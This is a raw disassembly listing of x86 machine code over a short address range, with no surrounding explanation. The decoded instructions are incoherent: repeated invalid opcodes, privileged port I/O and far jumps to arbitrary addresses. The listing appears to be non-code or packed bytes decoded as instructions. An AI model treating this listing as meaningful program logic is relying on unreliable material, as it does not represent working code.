  4111f3:	dec    eax
  4111f4:	loope  0x41121a
  4111f6:	shr    DWORD PTR [ecx+0x1174d1a],1
  4111fc:	lods   al,BYTE PTR ds:[esi]
  4111fd:	ror    ch,1
  4111ff:	inc    edi
  411200:	xchg   ebx,eax
  411201:	in     eax,dx
  411202:	out    dx,al
  411203:	mov    ebx,0xc6c5733
  411208:	sub    BYTE PTR [eax-0x66e95988],cl
  41120e:	mov    bh,0xc0
  411210:	imul   esp,DWORD PTR [edi],0xffffffb8
  411213:	push   0x948820c3
  411218:	leave  
  411219:	xor    al,BYTE PTR [ebp-0x6939a269]
  41121f:	mov    ah,0xfd
  411221:	popf   
  411222:	fdiv   st,st(1)
  411224:	(bad)  
  411225:	fst    st(2)
  411227:	icebp  
  411228:	lods   al,BYTE PTR ds:[esi]
  411229:	xor    esp,DWORD PTR [ebx-0x10c25244]
  41122f:	lods   al,BYTE PTR ds:[esi]
  411230:	xchg   DWORD PTR [ebx],esi
  411232:	jne    0x41122a
  411234:	and    DWORD PTR [esi-0xe],0x168394dc
  41123b:	test   eax,0x7d10c9ad
  411240:	and    ch,BYTE PTR [edx]
  411242:	cs dec edi
  411244:	das    
  411245:	fwait
  411246:	sub    dl,BYTE PTR [edi+ebx*2-0x31]
  41124a:	sahf   
  41124b:	out    dx,al
  41124c:	mov    si,0xbc9d
  411250:	int3   
  411251:	push   ebp
  411252:	mov    al,ds:0x5e7f8d78
  411257:	xor    eax,0xf2e3f166
  41125c:	cwde   
  41125d:	mov    ah,0x24
  41125f:	pop    DWORD PTR [ebx+0x55d56564]
  411265:	sti    
  411266:	ds popw ds
  411269:	or     esi,DWORD PTR [edx+0x71]
  41126c:	jg     0x4112c3
  41126e:	outs   dx,DWORD PTR ds:[esi]
  41126f:	enter  0x7cac,0xc1
  411273:	mov    al,ds:0x2841699d
  411278:	mov    al,0x49
  41127a:	xor    DWORD PTR [edi+0x58],eax
  41127d:	dec    ecx
  41127e:	pop    es
  41127f:	cwde   
  411280:	or     DWORD PTR [edx-0x48],eax
  411283:	mov    DWORD PTR ds:0x99f30d90,esi
  411289:	or     ch,BYTE PTR [eax]
  41128b:	scas   eax,DWORD PTR es:[edi]
  41128c:	(bad)  
  41128e:	pop    eax
  41128f:	int    0x73
  411291:	or     al,0x27
  411293:	add    al,0x3b
  411295:	xor    eax,0xbefdbc25
  41129a:	fwait
  41129b:	in     al,dx
  41129c:	dec    ecx
  41129d:	imul   ebp,DWORD PTR [ebp+0x1f],0x65
  4112a1:	cmp    al,0x17
  4112a3:	cmp    bh,BYTE PTR [ecx-0x44a2aec4]
  4112a9:	out    dx,al
  4112aa:	cdq    
  4112ab:	or     eax,0x7eb966ad
  4112b0:	cmp    eax,DWORD PTR [eax+ebx*1+0x4f]
  4112b4:	push   esi
  4112b5:	(bad)  
  4112b7:	int    0xb7
  4112b9:	fisub  WORD PTR [eax-0x67ac90e3]
  4112bf:	rcr    BYTE PTR [esi+0xdec231c],0x19
  4112c6:	and    al,0x59
  4112c8:	jmp    0x411254
  4112ca:	call   0x337df791
  4112cf:	sbb    DWORD PTR [esi],ebx
  4112d1:	(bad)  
  4112d2:	(bad)  
  4112d5:	cmp    eax,0x54ed3658
  4112da:	mov    bl,0xcc
  4112dc:	(bad)  
  4112dd:	stc    
  4112de:	(bad)  
  4112df:	mov    al,ds:0xc62445f3
  4112e4:	cs fxch st(5)
  4112e7:	dec    ecx
  4112e8:	scas   eax,DWORD PTR es:[edi]
  4112e9:	inc    edi
  4112ea:	sbb    ch,BYTE PTR [ebx+0x33]
  4112ed:	shr    ebp,0x5a
  4112f0:	imul   eax,DWORD PTR [ebp-0x6e988e3f],0x0
  4112f7:	pop    es
  4112f8:	je     0x411324
  4112fa:	pop    edi
  4112fb:	push   0x4f385baa
  411300:	push   esi
  411301:	stos   BYTE PTR es:[edi],al
  411302:	inc    esp
  411303:	es jle 0x4112bd
  411306:	imul   ebx,DWORD PTR [eax+0x5],0xffffff91
  41130a:	and    eax,ebp
  41130c:	(bad)  
  41130d:	test   al,0xea
  41130f:	(bad)  
  411311:	mov    edx,0x67720dff
  411316:	dec    ebp
  411317:	loopne 0x41134f
  411319:	ret    
  41131a:	dec    edi
  41131b:	xchg   edx,eax
  41131c:	push   eax
  41131d:	lods   al,BYTE PTR ds:[esi]
  41131e:	sub    DWORD PTR [edx-0x2753ccb3],ecx
  411324:	sbb    dl,BYTE PTR [eax+edx*1]
  411327:	and    ecx,eax
  411329:	addr16 sub eax,0xf605db6e
  41132f:	js     0x4112c4
  411331:	ds ror ebx,0x41
  411335:	inc    dh
  411337:	push   0x25
  411339:	xchg   ecx,eax
  41133a:	and    BYTE PTR [ebp+eax*2+0xa],0x46
  41133f:	mov    cs:0x752ec733,al
  411345:	rcl    BYTE PTR [ebx],cl
  411347:	inc    esp
  411348:	adc    cl,BYTE PTR [ebx-0x3d4bcb1c]
  41134e:	mov    dl,bh
  411350:	stos   DWORD PTR es:[edi],eax
  411351:	xor    BYTE PTR [ebx],ah
  411353:	dec    ecx
  411354:	ins    DWORD PTR es:[edi],dx
  411355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411356:	mov    esp,ecx
  411358:	mov    al,BYTE PTR [eax-0x1a]
  41135b:	mov    cl,0x52
  41135d:	lds    esp,FWORD PTR [ebx+eax*1+0x7e]
  411361:	js     0x411347
  411363:	in     eax,dx
  411364:	jg     0x4113dd
  411366:	mov    DWORD PTR [esi-0x53a58917],esi
  41136c:	mov    eax,ds:0xf8dc3abd
  411371:	xchg   ebp,eax
  411372:	pushf  
  411373:	bound  ecx,QWORD PTR [edx-0x7]
  411376:	mov    al,0xc7
  411378:	jb     0x411380
  41137a:	or     DWORD PTR [edx+0x15],0x60
  41137e:	scas   eax,DWORD PTR es:[edi]
  41137f:	stos   BYTE PTR es:[edi],al
  411380:	jmp    0x4113de
  411382:	dec    ecx
  411383:	mov    ch,0x43
  411385:	ss xchg ecx,eax
  411387:	pushf  
  411388:	fistp  QWORD PTR [ebx]
  41138a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138b:	sahf   
  41138c:	gs dec ecx
  41138e:	mov    al,0x31
  411390:	add    al,0xb0
  411392:	cs out dx,al
  411394:	sar    BYTE PTR ds:0xe8207694,1
  41139a:	cli    
  41139b:	in     al,dx
  41139c:	jle    0x411370
  41139e:	push   0xfffffffa
  4113a0:	and    BYTE PTR [eax-0x3b7a09f4],al
  4113a6:	or     al,0x24
  4113a8:	iret   
  4113a9:	adc    bh,BYTE PTR [edi-0x66]
  4113ac:	outs   dx,DWORD PTR ds:[esi]
  4113ad:	jmp    0x96cd:0xee903c44
  4113b4:	and    eax,0x3d72e4b0
  4113b9:	stos   BYTE PTR es:[edi],al
  4113ba:	and    BYTE PTR [ecx-0x3a4080ab],bl
  4113c0:	shr    esp,cl
  4113c2:	sub    ebx,0xffffffb0
  4113c5:	xchg   ebx,eax
  4113c6:	cmc    
  4113c7:	lods   al,BYTE PTR ds:[esi]
  4113c8:	cld    
  4113c9:	icebp  
  4113ca:	add    BYTE PTR [edx],dl
  4113cc:	inc    ecx
  4113cd:	aam    0x8b
  4113cf:	in     al,0x22
  4113d1:	and    dh,BYTE PTR [edx-0x19d64e32]
  4113d7:	in     eax,0x5a
  4113d9:	inc    edx
  4113da:	xchg   esi,esi
  4113dc:	lock shl DWORD PTR [eax],cl
  4113df:	stos   DWORD PTR es:[edi],eax
  4113e0:	stc    
  4113e1:	push   esp
  4113e2:	outs   dx,DWORD PTR ds:[esi]
  4113e3:	(bad)  
  4113e4:	pusha  
  4113e5:	inc    edi
  4113e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113e7:	xor    DWORD PTR [ebx-0x34],ebp
  4113ea:	inc    eax
  4113eb:	scas   eax,DWORD PTR es:[edi]
  4113ec:	inc    edi
  4113ed:	jp     0x411382
  4113ef:	or     eax,0x234619bc
  4113f4:	inc    edi
  4113f5:	mov    bh,0x11
  4113f7:	ds adc al,0x66
  4113fa:	jne    0x41145e
  4113fc:	cs es jmp 0x41139b
  411400:	sub    al,0x3d
  411402:	popa   
  411403:	pop    ss
  411404:	sbb    eax,0xfd01ffe2
  411409:	jmp    0x41145b
  41140b:	xchg   esi,eax
  41140c:	push   es
  41140d:	in     eax,dx
  41140e:	popf   
  41140f:	sti    
  411410:	sahf   
  411411:	ror    DWORD PTR [ecx+0x25],0x59
  411415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411416:	jecxz  0x41142e
  411418:	retf   
  411419:	dec    edx
  41141a:	xchg   esi,eax
  41141b:	xor    eax,0xd4cd670a
  411420:	cmp    BYTE PTR [edi-0x45],ah
  411423:	arpl   dx,si
  411425:	rcl    ch,0x47
  411428:	lahf   
  411429:	imul   esi,DWORD PTR [esi-0x4d92d521],0xea8fa89f
  411433:	cwde   
  411434:	imul   ebx,ebx,0xe283c4fa
  41143a:	in     al,0x62
  41143c:	frstor [edi]
  41143e:	ds and eax,0xc557935f
  411444:	xchg   BYTE PTR [ebp-0x55223736],bl
  41144a:	sub    ebp,DWORD PTR [eax+0x3ee72a8b]
  411450:	fnsave [eax+ebx*2-0x6bbfbc5b]
  411457:	out    dx,al
  411458:	mov    ds:0x6251f01f,al
  41145d:	pop    ds
  41145e:	xor    al,0x3e
  411460:	ret    
  411461:	xchg   edx,eax
  411462:	sbb    BYTE PTR [edi+0x74486769],dl
  411468:	cmp    al,0xae
  41146a:	or     al,0x98
  41146c:	jp     0x41146f
  41146e:	sahf   
  41146f:	hlt    
  411470:	jmp    FWORD PTR [ebx-0x19]
  411473:	jno    0x4114b5
  411475:	add    al,BYTE PTR [ebx]
  411477:	inc    esp
  411478:	out    0xf6,eax
  41147a:	mov    ebx,0xb36cc886
  41147f:	lds    ecx,FWORD PTR [ebx]
  411481:	xchg   edx,eax
  411482:	leave  
  411483:	rcl    BYTE PTR [edx+0x37ffe35b],1
  411489:	test   DWORD PTR [ebx-0x22b98918],0xdb4987e5
  411493:	jnp    0x4114e0
  411495:	int3   
  411496:	hlt    
  411497:	fwait
  411498:	push   edx
  411499:	imul   esp,DWORD PTR [ebx],0xffffffe5
  41149c:	sbb    esi,ebp
  41149e:	sub    al,BYTE PTR [ebx+0x3f]
  4114a1:	or     DWORD PTR ss:[ecx-0x65de9da7],0xf5c14ba4
  4114ac:	mov    edi,0x8a1dbdee
  4114b1:	addr16 div ecx
  4114b4:	add    ebx,edi
  4114b6:	cdq    
  4114b7:	addr16 ds (bad) 
  4114ba:	stc    
  4114bb:	jno    0x4114df
  4114bd:	mov    bh,0xe3
  4114bf:	add    bl,BYTE PTR [edx-0x2d5c3651]
  4114c5:	(bad)  
  4114c7:	cmp    bh,bl
  4114c9:	jcxz   0x4114b1
  4114cc:	fstp   QWORD PTR [ebp-0x41ff2c14]
  4114d2:	bound  esp,QWORD PTR [eax+edi*4]
  4114d5:	jge    0x4114c9
  4114d7:	daa    
  4114d8:	gs (bad) 
  4114da:	mov    edi,0xcd7d1229
  4114df:	lea    ecx,[edi-0x32df8e40]
  4114e5:	daa    
  4114e6:	enter  0xea3d,0x65
  4114ea:	xor    ecx,DWORD PTR [ebx+0x25]
  4114ed:	in     eax,dx
  4114ee:	sbb    eax,0xa62bdb70
  4114f3:	jl     0x411490
  4114f5:	push   edx
  4114f6:	xor    ah,BYTE PTR [eax+0x2]
  4114f9:	adc    bh,BYTE PTR [ebx]
  4114fb:	or     esp,DWORD PTR [ebx-0x2166af2d]
  411501:	stos   DWORD PTR es:[edi],eax
  411502:	mov    bl,0xe3
  411504:	stos   BYTE PTR es:[edi],al
  411505:	xchg   edi,eax
  411506:	xor    BYTE PTR [eax-0x28],0x8e
  41150a:	pop    ss
  41150b:	mov    esi,0x66e36af0
  411510:	add    bh,cl
  411512:	push   ss
  411513:	dec    ecx
  411514:	and    eax,esp
  411516:	mov    edx,0x2c5058d7
  41151b:	cmp    DWORD PTR [esi],ecx
  41151d:	pusha  
  41151e:	inc    eax
  41151f:	pop    ds
  411520:	push   es
  411521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411522:	xor    al,0x78
  411524:	adc    eax,0x72da3f2a
  411529:	sar    ebp,cl
  41152b:	jge    0x411521
  41152d:	aas    
  41152e:	mov    ebx,edx
  411530:	mov    al,0x3a
  411532:	loope  0x411542
  411534:	lods   al,BYTE PTR ds:[esi]
  411535:	xchg   esi,eax
  411536:	dec    edi
  411537:	aas    
  411538:	test   al,0x6c
  41153a:	mov    esi,0x9412c974
  41153f:	lods   al,BYTE PTR ds:[esi]
  411540:	xlat   BYTE PTR ds:[ebx]
  411541:	xchg   edi,eax
  411542:	aaa    
  411543:	and    BYTE PTR [edx+0x97543bb],al
  411549:	xchg   ebp,eax
  41154a:	and    eax,DWORD PTR [ebx-0x4d9501c7]
  411550:	mov    ch,0xdb
  411552:	xchg   esp,eax
  411553:	mov    esi,cs
  411555:	dec    edx
  411556:	stos   BYTE PTR es:[edi],al
  411557:	int3   
  411558:	out    0x81,al
  41155a:	cmp    ebp,DWORD PTR [esi]
  41155c:	es (bad) 
  41155e:	sti    
  41155f:	cmp    BYTE PTR [ebp-0x45381208],dh
  411565:	fs jno 0x411537
  411568:	inc    esi
  411569:	pop    edi
  41156a:	jle    0x4115d0
  41156c:	mov    bh,0xb0
  41156e:	popf   
  41156f:	inc    ebx
  411570:	mov    ds:0x91cd18ec,eax
  411575:	data16 outs dx,BYTE PTR ds:[esi]
  411577:	mov    ah,0xb1
  411579:	out    0xaf,al
  41157b:	stc    
  41157c:	fs cmc 
  41157e:	xor    dh,dh
  411580:	fisub  DWORD PTR [ebx+0x9]
  411583:	dec    ecx
  411584:	cmp    BYTE PTR [eax+eiz*4+0x487fd656],ah
  41158b:	addr16 ret 0x331b
  41158f:	mov    al,0x45
  411591:	xchg   ecx,eax
  411592:	mov    ebx,0xf6ed401b
  411597:	push   ds
  411598:	retf   0xbd98
  41159b:	(bad)  
  41159c:	rcl    ch,0x65
  41159f:	fdiv   QWORD PTR [ebp+0x543da603]
  4115a5:	mov    dh,0xa9
  4115a7:	jno    0x411536
  4115a9:	(bad)  
  4115aa:	shr    BYTE PTR [ebx],0x1d
  4115ad:	inc    edx
  4115ae:	retf   
  4115af:	push   ecx
  4115b0:	cmp    bl,dl
  4115b2:	push   0xffffffc5
  4115b4:	aam    0x59
  4115b6:	bound  esi,QWORD PTR [eax]
  4115b8:	bound  ebx,QWORD PTR [ebx+0xf]
  4115bb:	inc    edi
  4115bc:	lods   eax,DWORD PTR ds:[esi]
  4115bd:	mov    ch,0xdb
  4115bf:	in     al,dx
  4115c0:	retf   0xb955
  4115c3:	(bad)  
  4115c4:	ss pop ss
  4115c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c7:	xor    DWORD PTR [ebx+0x78],edx
  4115ca:	jno    0x4115a7
  4115cc:	mov    ah,0x6f
  4115ce:	lock fnsave [ecx+0x1074813]
  4115d5:	and    al,0xec
  4115d7:	xor    esi,DWORD PTR [eax+0x74]
  4115da:	push   0x243e0b37
  4115df:	loope  0x411614
  4115e1:	jle    0x4115ea
  4115e3:	cmovle esp,ebx
  4115e6:	jmp    0xf631:0xf8888fe9
  4115ed:	aas    
  4115ee:	lods   eax,DWORD PTR ds:[esi]
  4115ef:	(bad)  
  4115f0:	cmc    
  4115f1:	js     0x4115e3
  4115f3:	mov    eax,0x96036c53
  4115f8:	jg     0x41165a
  4115fa:	or     eax,0xecaf9f87
  4115ff:	(bad)  
  411600:	out    0x8d,eax
  411602:	jne    0x4115f9
  411604:	popf   
  411605:	mov    edi,0xaf5a77cd
  41160a:	mov    dh,0x30
  41160c:	aas    
  41160d:	popf   
  41160e:	jp     0x41167a
  411610:	daa    
  411611:	mov    dl,0xec
  411613:	jmp    0x9c01:0x26069562
  41161a:	cmp    dl,BYTE PTR [ecx-0x27]
  41161d:	in     eax,0xaf
  41161f:	mov    bh,0xdf
  411621:	not    DWORD PTR [ebx+0x66b4136e]
  411627:	mov    es,WORD PTR [ecx]
  411629:	lds    ecx,FWORD PTR [eax]
  41162b:	pushw  ds
  41162d:	aas    
  41162e:	mov    ds:0xb9423c68,al
  411633:	xchg   ebp,eax
  411634:	pop    es
  411635:	dec    eax
  411636:	cs aad 0x9a
  411639:	xchg   esp,eax
  41163a:	or     dh,al
  41163c:	push   es
  41163d:	mov    dh,0xa6
  41163f:	add    BYTE PTR [ebp+0x7ec7db19],al
  411645:	mov    al,0x37
  411647:	(bad)  
  411648:	jne    0x411656
  41164a:	enter  0xbaf8,0x4f
  41164e:	arpl   WORD PTR [eax-0x1b4724a7],ax
  411654:	jne    0x411620
  411656:	mov    eax,0x562e92ec
  41165b:	add    ch,BYTE PTR [edx+0x45fe544e]
  411661:	sub    DWORD PTR [edi-0x762d0d6b],edi
  411667:	push   ebx
  411668:	push   edi
  411669:	xchg   edi,eax
  41166a:	test   DWORD PTR [esi+0x5b],eax
  41166d:	mov    ch,0x77
  41166f:	mov    eax,0x635a5eda
  411674:	adc    bl,BYTE PTR [ecx]
  411676:	hlt    
  411677:	outs   dx,BYTE PTR ds:[esi]
  411678:	add    ecx,0x38
  41167b:	out    0xb8,al
  41167d:	add    al,0x37
  41167f:	std    
  411680:	pop    edx
  411681:	and    ebp,DWORD PTR [ebx]
  411683:	cmp    ebx,edi
  411685:	jo     0x41162f
  411687:	lods   eax,DWORD PTR ds:[esi]
  411688:	xor    esi,DWORD PTR [esi-0x3f1991cc]
  41168e:	or     dl,BYTE PTR [ebx-0x1616e51e]
  411694:	pop    eax
  411695:	and    DWORD PTR [ecx+0x5f025a8c],ebp
  41169b:	pusha  
  41169c:	popa   
  41169d:	ja     0x4116a1
  41169f:	retf   
  4116a0:	(bad)  
  4116a1:	clc    
  4116a2:	pop    es
  4116a3:	arpl   sp,di
  4116a5:	stos   BYTE PTR es:[edi],al
  4116a6:	xchg   ecx,eax
  4116a7:	int    0x59
  4116a9:	sub    edx,ebp
  4116ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ac:	jmp    0x4116d5
  4116ae:	mov    bh,BYTE PTR [esi]
  4116b0:	ficom  DWORD PTR [ebx+edx*4+0xa]
  4116b4:	fs pop ss
  4116b6:	call   0x19a927f8
  4116bb:	daa    
  4116bc:	inc    eax
  4116bd:	pop    esp
  4116be:	xlat   BYTE PTR ds:[ebx]
  4116bf:	push   ebp
  4116c0:	(bad)
  4116c4:	xchg   esi,eax
  4116c5:	cs mov ecx,0x4760aa77
  4116cb:	adc    ebx,DWORD PTR [ebx+eiz*1+0x7f]
  4116cf:	mov    ch,0x9f
  4116d1:	repz ds jnp 0x41173c
  4116d5:	sahf   
  4116d6:	lods   eax,DWORD PTR ds:[esi]
  4116d7:	int3   
  4116d8:	pop    edx
  4116d9:	jbe    0x4116ca
  4116db:	pop    esi
  4116dc:	div    BYTE PTR [ecx-0x4c7d02ec]
  4116e2:	jbe    0x4116b4
  4116e4:	jns    0x4116cf
  4116e6:	std    
  4116e7:	mov    cs,WORD PTR [ebp+0xa295b6e]
  4116ed:	sbb    BYTE PTR [edi-0x6e151a77],al
  4116f3:	dec    esi
  4116f4:	into   
  4116f5:	fdiv   DWORD PTR [ebp+0x6d5900b2]
  4116fb:	inc    ebx
  4116fc:	add    eax,0xf4500e9c
  411701:	push   ss
  411702:	or     edi,DWORD PTR [edi-0x6c]
  411705:	mov    ecx,0x64b2a93d
  41170a:	adc    DWORD PTR [esi],ebp
  41170c:	fcomp  QWORD PTR [ecx+eax*1+0x3d1ace65]
  411713:	pop    edi
  411714:	cmp    al,0xba
  411716:	mov    dh,BYTE PTR [esi]
  411718:	fs call 0xf90f259d
  41171e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41171f:	pop    ss
  411720:	dec    edi
  411721:	mov    ecx,0x1a081c65
  411726:	cs mov bl,0xf0
  41172a:	push   edi
  41172b:	sub    bh,BYTE PTR [eax-0x3b80ce91]
  411731:	rcr    DWORD PTR [edx],0x7e
  411734:	jp     0x411787
  411736:	fld    TBYTE PTR [eax]
  411738:	inc    ebp
  411739:	jbe    0x4116fa
  41173b:	xchg   edx,eax
  41173c:	inc    ecx
  41173d:	cmp    al,0x1c
  41173f:	mov    ch,0xce
  411741:	adc    edi,edx
  411743:	arpl   WORD PTR [edx-0x79e4f675],bp
  411749:	push   0xb00121d8
  41174e:	adc    al,0x5c
  411750:	or     ah,dl
  411752:	mov    eax,0xc4d4754f
  411757:	daa    
  411758:	outs   dx,BYTE PTR ds:[esi]
  411759:	xor    edx,0x59
  41175c:	xlat   BYTE PTR ds:[ebx]
  41175d:	xor    ecx,edx
  41175f:	call   0x9ef4:0xbb1c9f92
  411766:	adc    BYTE PTR [esi],cl
  411768:	test   al,0xef
  41176a:	mov    esp,0xb115196a
  41176f:	mov    eax,ds:0x7f6263ae
  411774:	(bad)  
  411775:	fistp  WORD PTR [eax+0x35]
  411778:	aad    0x4e
  41177a:	rol    DWORD PTR [ecx-0x25],cl
  41177d:	test   al,0xf1
  41177f:	mov    ecx,edi
  411781:	xchg   ebx,eax
  411782:	ss push edx
  411784:	xchg   edx,eax
  411785:	sub    ecx,DWORD PTR [edi]
  411787:	dec    ebp
  411788:	mov    gs,WORD PTR [esi+0x14c8ef2c]
  41178e:	pop    edx
  41178f:	mov    dl,0x72
  411791:	push   eax
  411792:	mov    ebx,0x94238cb5
  411797:	repz mov dl,0x6d
  41179a:	dec    eax
  41179b:	and    al,0x5d
  41179d:	adc    BYTE PTR [edx],dh
  41179f:	rcl    DWORD PTR [ecx-0x15],0x1
  4117a3:	stc    
  4117a4:	pushf  
  4117a5:	mov    dh,BYTE PTR [ebx+0x4b]
  4117a8:	xchg   BYTE PTR [ecx-0x3ea6b736],dl
  4117ae:	jg     0x41179b
  4117b0:	fcmovnb st,st(2)
  4117b2:	inc    ebx
  4117b3:	mov    DWORD PTR [ecx-0x439389e8],esi
  4117b9:	out    dx,eax
  4117ba:	jne    0x4117d4
  4117bc:	popa   
  4117bd:	les    edi,FWORD PTR [edx]
  4117bf:	repz retf 
  4117c1:	inc    edx
  4117c2:	add    cl,BYTE PTR [esi-0x2a]
  4117c5:	std    
  4117c6:	cs inc edi
  4117c8:	fild   QWORD PTR [ebx+0x3e5cdec0]
  4117ce:	mov    dh,0x6f
  4117d0:	jecxz  0x4117cc
  4117d2:	mov    ch,0x6d
  4117d4:	mov    al,ds:0x477c9495
  4117d9:	add    eax,0xb23cb501
  4117de:	cwde   
  4117df:	std    
  4117e0:	push   esp
  4117e1:	mov    edx,0xbe447f3e
  4117e6:	adc    BYTE PTR [esi-0x41],ch
  4117e9:	inc    edi
  4117ea:	sti    
  4117eb:	push   0xb607b775
  4117f0:	ret    
  4117f1:	mov    ecx,0x60df7b97
  4117f6:	das    
  4117f7:	adc    dh,dh
  4117f9:	add    al,0x55
  4117fb:	sbb    eax,0x240277ae
  411800:	inc    eax
  411801:	jle    0x4117a4
  411803:	and    eax,0xea82beea
  411808:	pop    ebx
  411809:	and    DWORD PTR [esp+ebx*8-0x20],edx
  41180d:	sbb    BYTE PTR [edi-0x75673752],bl
  411813:	lahf   
  411814:	hlt    
  411815:	imul   esp,DWORD PTR [ecx+0x4f],0xa2734597
  41181c:	pop    ebp
  41181d:	(bad)  
  41181f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411820:	mov    ch,BYTE PTR [ebx-0x5556597e]
  411826:	push   ds
  411827:	add    bl,BYTE PTR [ebp+0x15]
  41182a:	ficom  WORD PTR [edx+0x7f]
  41182d:	mov    eax,ss:0x375cfbff
  411833:	or     DWORD PTR [eax-0x49505763],0xffffffb7
  41183a:	dec    esp
  41183b:	sub    al,0xb9
  41183d:	scas   eax,DWORD PTR es:[edi]
  41183e:	adc    bh,BYTE PTR [ebp-0x2095f217]
  411844:	inc    ebp
  411845:	mov    esp,?
  411847:	out    0x5e,eax
  411849:	and    BYTE PTR [ecx],dh
  41184b:	icebp  
  41184c:	loop   0x4118a6
  41184e:	call   0xefd:0x709ebf1f
  411855:	mov    al,BYTE PTR [ebx]
  411857:	sub    eax,0x9c6dba70
  41185c:	inc    ecx
  41185d:	test   eax,0xbbb4aaa8
  411862:	ror    DWORD PTR [esi],0xf5
  411865:	stos   DWORD PTR es:[edi],eax
  411866:	sub    ebx,DWORD PTR [ecx]
  411868:	imul   esp,ebp,0xffffff91
  41186b:	out    dx,eax
  41186c:	clc    
  41186d:	sbb    edi,ebx
  41186f:	dec    eax
  411870:	mov    edx,0x24cef2a8
  411875:	mov    bl,0x3f
  411877:	fnstcw WORD PTR [ebp+0x3aaa76fb]
  41187d:	nop
  41187e:	jne    0x411839
  411880:	les    ebp,FWORD PTR [eax+0x58c98d3b]
  411886:	mov    BYTE PTR [edi+0x4433ff0],bl
  41188c:	push   cs
  41188d:	sbb    BYTE PTR [esp+eax*2+0x63],ah
  411891:	xor    al,BYTE PTR [edx+ebx*1-0x2ca87f36]
  411898:	bound  ebx,QWORD PTR [esi]
  41189a:	icebp  
  41189b:	popa   
  41189c:	and    ah,BYTE PTR [ebx+esi*8-0x4e]
  4118a0:	ja     0x41188e
  4118a2:	adc    al,0x5c
  4118a4:	sti    
  4118a5:	sbb    eax,0x73a90efd
  4118aa:	fisubr WORD PTR [ecx+0x53e9a43e]
  4118b0:	jo     0x4118a3
  4118b2:	adc    al,0xf3
  4118b4:	or     al,BYTE PTR [ecx-0x1d3db02c]
  4118ba:	push   ds
  4118bb:	xor    DWORD PTR [esi+0x2d],esp
  4118be:	rol    edx,cl
  4118c0:	ficom  DWORD PTR [ecx-0x4d7e78a1]
  4118c6:	mov    al,0xcb
  4118c8:	mov    WORD PTR [eax-0x1e024a60],es
  4118ce:	jo     0x41189f
  4118d0:	loope  0x411868
  4118d2:	cmp    eax,0xbe9fd229
  4118d7:	lea    eax,[ebx+0x4e]
  4118da:	cmp    BYTE PTR gs:[ebp+0x5b],al
  4118de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118df:	dec    ebx
  4118e0:	add    al,0xc4
  4118e2:	sbb    DWORD PTR es:[esi+0x76],esi
  4118e6:	test   esi,0xd4d2cdbd
  4118ec:	test   eax,0xd2af7701
  4118f1:	mov    edi,0x36335af1
  4118f6:	les    ebx,FWORD PTR [eax+0x1f]
  4118f9:	pusha  
  4118fa:	int3   
  4118fb:	fdiv   QWORD PTR [edx]
  4118fd:	mov    eax,ds:0x53593a15
  411902:	xor    DWORD PTR [ebp-0x245f6b39],0xda6cbf2b
  41190c:	int3   
  41190d:	test   eax,0xdf8183e0
  411912:	pop    es
  411913:	mov    edx,0x2f766303
  411918:	test   eax,0x605d0943
  41191d:	jge    0x41191b
  41191f:	sub    DWORD PTR [ecx+0x4d],ebp
  411922:	test   al,0xf9
  411924:	es je  0x4118ac
  411927:	pop    ss
  411928:	cmp    DWORD PTR [edi+0x36],eax
  41192b:	stos   DWORD PTR es:[edi],eax
  41192c:	stc    
  41192d:	inc    edi
  41192e:	jge    0x4118d5
  411930:	das    
  411931:	sbb    ch,BYTE PTR [ebx-0x4]
  411934:	mov    DWORD PTR [ebx-0x39],edx
  411937:	shl    DWORD PTR [ebp-0x68ff2bad],0xf9
  41193e:	ins    BYTE PTR es:[edi],dx
  41193f:	shl    BYTE PTR [eax+0x2f],cl
  411942:	push   0x274ae3d8
  411947:	or     eax,ebp
  411949:	out    dx,al
  41194a:	xchg   ebp,eax
  41194b:	push   esp
  41194c:	and    cl,BYTE PTR [ebx]
  41194e:	or     ebp,edi
  411950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411951:	push   eax
  411952:	xchg   esi,eax
  411953:	dec    esp
  411954:	mov    bh,0xf2
  411956:	scas   al,BYTE PTR es:[edi]
  411957:	scas   eax,DWORD PTR es:[edi]
  411958:	xchg   esi,eax
  411959:	jge    0x411910
  41195b:	arpl   WORD PTR [ebx+0x62bd35f],sp
  411961:	sub    BYTE PTR [eax-0x35],ah
  411964:	xchg   ebx,eax
  411965:	adc    DWORD PTR [ecx-0x338f23ec],edx
  41196b:	mov    esp,0x7909982
  411970:	retf   
  411971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411972:	jo     0x411920
  411974:	ins    DWORD PTR es:[edi],dx
  411975:	retf   0x35ae
  411978:	data16 xor al,0x25
  41197b:	clc    
  41197c:	pop    edi
  41197d:	xor    ebp,ebx
  41197f:	test   DWORD PTR [edi-0x60],esi
  411982:	adc    eax,0x6897f558
  411987:	push   esi
  411988:	push   ebp
  411989:	jmp    0xbfbccf13
  41198e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41198f:	mov    eax,0x6ca42283
  411994:	lods   al,BYTE PTR ds:[esi]
  411995:	mov    ebx,DWORD PTR [eax-0x69]
  411998:	into   
  411999:	imul   eax,DWORD PTR [esi+0x1a],0x11
  41199d:	stos   BYTE PTR es:[edi],al
  41199e:	clc    
  41199f:	xchg   edi,eax
  4119a0:	xchg   edi,eax
  4119a1:	xchg   edi,eax
  4119a2:	call   0xeb04:0xb3263a30
  4119a9:	shl    BYTE PTR [ebx-0x5],cl
  4119ac:	xchg   ebx,eax
  4119ad:	aas    
  4119ae:	into   
  4119af:	push   ebx
  4119b0:	sbb    eax,0xb2332421
  4119b5:	or     edi,DWORD PTR [edi]
  4119b7:	cmp    DWORD PTR [edx+eiz*8],edi
  4119ba:	inc    edx
  4119bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119bc:	pop    esp
  4119bd:	test   eax,0xeed714b8
  4119c2:	loope  0x4119ac
  4119c4:	and    DWORD PTR [edi-0xd],0x54ae03fa
  4119cb:	cmc    
